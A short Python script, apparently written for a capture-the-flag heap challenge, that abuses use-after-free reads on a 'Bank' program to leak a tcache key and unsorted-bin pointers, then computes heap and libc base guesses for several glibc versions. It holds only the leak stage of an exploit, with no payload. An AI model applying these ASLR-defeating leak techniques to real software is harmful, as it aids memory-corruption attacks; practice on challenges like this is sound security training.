#!/usr/bin/env python3
import sys, struct
sys.path.insert(0, '/home/boss/Works/ctf/Zero_trace/First_nATIONAL_HEAP_bANK')
from bank import Bank, u64, p64

b = Bank()
b.open(0, 0x20, b'A'*0x20)     # tcache chunk first
b.close(0)
d0 = b.view(0)
key = u64(d0[8:16])
heap = key - 0x10
print('tcache key', hex(key), 'heap_guess', hex(heap))

b.open(10, 0x500, b'C'*0x500)  # large
b.open(11, 0x20, b'D'*0x20)    # guard
b.close(10)
d = b.view(10)
fd, bk = u64(d[:8]), u64(d[8:16])
print('unsorted fd', hex(fd), 'bk', hex(bk))
for name, ma in [('9.7', 0x1ebb80), ('9.9', 0x1ecb80), ('9.12?', 0x1ecb80)]:
    base = fd - ma - 0x60
    print(name, 'base', hex(base), 'page', hex(base & 0xfff))
# fd/bk should differ by 0x10? both same for single chunk
print('fd-bk', hex((fd-bk) & (2**64-1)))
